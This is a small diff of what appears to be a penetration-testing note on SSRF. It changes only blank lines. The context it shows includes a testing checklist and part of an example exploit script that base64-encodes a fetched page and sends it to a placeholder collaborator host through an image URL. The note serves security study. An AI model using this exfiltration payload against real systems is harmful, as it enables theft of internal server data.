@@ -10,7 +10,6 @@ An SSRF vulnerability allows an attacker to make requests originating from the w
 
 ![[../attachments/XSS/image.png]]
 
-
 - [ ] Try other URI schemes, `file://`, etc.
 - [ ] Try looking for common images like `favicon.ico`
     - Check the location of the image on the server
@@ -60,7 +59,6 @@ Example exploit script
     // put your colab instance below to you can capture the contents of /blind/recipe
     exfil.onload = function(){ document.write('<img src="{colab_instance}}/?x=' + btoa(this.responseText) + '">'); }
 </script>
-
 ```
 
 ## References
